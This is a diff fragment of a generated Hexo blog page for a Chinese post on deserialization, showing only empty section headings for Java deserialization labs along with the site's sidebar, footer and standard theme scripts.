-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
-</body>
-</html>
+<h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3></div><div class="article-licensing box"><div class="licensing-title"><p>反序列化</p><p><a href="http://example.com/2023/02/09/反序列化/">http://example.com/2023/02/09/反序列化/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-01-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="link-muted mr-2" rel="tag" href="/tags/Java/">Java</a><a class="link-muted mr-2" rel="tag" href="/tags/PHP/">PHP</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/XSS/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">XSS</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/08/HELLO/"><span class="level-item">HELLO</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/icon.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">This is Potato&#039;s blog~</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Potatowo233" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/01/"><span class="level-start"><span class="level-item">一月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">十月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Docker/"><span class="tag">Docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Misc/"><span class="tag">Misc</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqli/"><span class="tag">sqli</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span class="tag">正则表达式</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">做题记录</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">学习记录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"><span class="level-start"><span class="level-item">Docker</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"><span class="level-start"><span class="level-item">渗透工具</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"><span class="level-start"><span class="level-item">自建靶场</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">常见漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">Web漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-07T04:46:48.000Z">2024-01-07</time></p><p class="title"><a href="/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/">Vim学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-01T08:06:34.000Z">2024-01-01</time></p><p class="title"><a href="/2024/01/01/16-PHP-Magic-Methods/">16_PHP_Magic_Methods</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:46:17.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/">CVE-2023-47130分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:19:30.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/">CVE-2023-41892分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-23T13:38:37.000Z">2023-12-23</time></p><p class="title"><a href="/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">记一次CMS代码审计</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
